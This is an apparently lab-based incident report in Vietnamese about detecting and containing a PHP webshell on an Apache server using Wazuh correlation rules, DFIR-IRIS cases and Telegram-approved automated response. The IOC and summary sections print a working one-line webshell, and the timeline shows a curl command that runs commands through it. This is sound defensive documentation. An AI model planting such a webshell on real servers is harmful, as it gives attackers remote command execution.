# Incident Report: Webshell trên máy chủ web

## 1. Thông tin chung

| Mục | Nội dung |
|---|---|
| Loại sự cố | Webshell PHP (mô phỏng trong lab) |
| Hệ thống bị ảnh hưởng | Máy chủ web Apache2 (Ubuntu), thư mục `/var/www/html` |
| Rule kích hoạt chính | Wazuh Rule **100520**, level **15** (CRITICAL, tương quan) |
| Rule thành phần | `100500` (FIM, level 8), `100510` (hành vi `www-data`, level 12) |
| Case DFIR-IRIS | #722 (tạo tự động) |
| Trạng thái | Đã ngăn chặn (khóa ghi web root, dừng Apache2) |

## 2. Tóm tắt

Một file PHP chứa `system($_GET["cmd"])` xuất hiện trong web root, ngay sau đó tiến trình `www-data` thực thi lệnh hệ thống. Hai dấu hiệu này kết hợp kích hoạt rule tương quan 100520. Shuffle tạo case trên DFIR-IRIS, hỏi quản trị viên qua Telegram; sau khi được duyệt, Active Response khóa quyền ghi thư mục web và dừng Apache2.

## 3. Timeline

| Bước | Sự kiện | Rule |
|---|---|---|
| 1 | Tạo `/var/www/html/t_corr.php` (webshell một dòng) | **100500** (FIM, level 8) |
| 2 | `curl ...t_corr.php?cmd=whoami`, `www-data` chạy lệnh qua `execve` | **100510** (auditd, level 12) |
| 3 | Hai sự kiện xảy ra trong vòng 300 giây | **100520** (level 15) |
| 4 | Shuffle tạo case #722 và 8 task trên DFIR-IRIS | |
| 5 | Telegram hỏi duyệt (16:35), quản trị viên đồng ý, bot báo "Đã xử lý case" (16:38) | |
| 6 | Active Response: khóa quyền ghi web root, dừng Apache2 | |

## 4. Phát hiện và phân tích

- **FIM realtime** trên `/var/www/html` phát hiện file `.php` mới (100500); nếu file bị sửa thì 100501, nếu nội dung chứa pattern webshell thì 100502.
- **auditd** ghi `execve` của uid 33 (`www-data`) với key `webshell_command_exec`; Wazuh đọc audit log và sinh 100510.
- **Rule tương quan 100520** dùng `if_matched_sid 100500` + `if_sid 100510` trong `timeframe=300`: một file PHP vừa xuất hiện mà tiến trình web server đã chạy lệnh hệ thống là dấu hiệu mạnh của webshell, ít false positive hơn khi xét từng rule riêng lẻ.

## 5. IOC

| Loại | Giá trị |
|---|---|
| File đáng ngờ | `/var/www/html/t_corr.php` |
| Nội dung | `<?php system($_GET["cmd"]); ?>` |
| Tài khoản thực thi | `www-data` (uid 33) |
| Hành vi | `execve` (whoami, id, cat, ...) từ tiến trình web |

## 6. Ánh xạ MITRE ATT&CK

| Tactic | Technique | ID |
|---|---|---|
| Persistence | Server Software Component: Web Shell | T1505.003 |

## 7. Ứng phó

1. **Ghi nhận:** case #722 trên DFIR-IRIS, thư mục khai thác `/var/www/html`, 8 task gán cho Analyst và Incident Responder.
2. **Xác nhận:** Telegram nêu rõ hai dấu hiệu tương quan và hỏi có khóa quyền ghi + tạm dừng Apache không.
3. **Ngăn chặn (Active Response, sau khi duyệt):**
   - `mitre-m1018-lock-webdir`: `chmod -R a-w /var/www/html`.
   - `mitre-m1042-suspend-service`: `systemctl stop apache2`.
4. **Kết quả kiểm chứng:** thao tác `rm` file webshell sau đó trả `Permission denied`, xác nhận quyền ghi đã bị khóa.
5. **Cập nhật:** Telegram báo "Đã xử lý case", ghi chú vào case.

## 8. Việc còn lại cho analyst (các task đã tạo)

Alert Validation, Investigate Source, Scope Assessment, Collect Indicators, Eradication (xóa webshell, rà soát tài khoản), Recovery (gỡ khóa quyền, khởi động lại Apache sau khi xác nhận sạch), Lessons Learned.

## 9. Khuyến nghị

- Chạy web server bằng quyền tối thiểu; chặn upload file thực thi vào web root.
- Tắt các hàm nguy hiểm trong PHP (`system`, `exec`, `passthru`, `shell_exec`) khi không cần.
- Bổ sung quét webshell theo chữ ký và tích hợp threat intelligence.
- Có quy trình gỡ khóa (rollback) sau Active Response để khôi phục dịch vụ an toàn.

## 10. Hình ảnh

Xem các Hình 11–16 trong [README](../README.md#6-kịch-bản-2-webshell-phát-hiện-đa-tầng-rule-tự-viết).
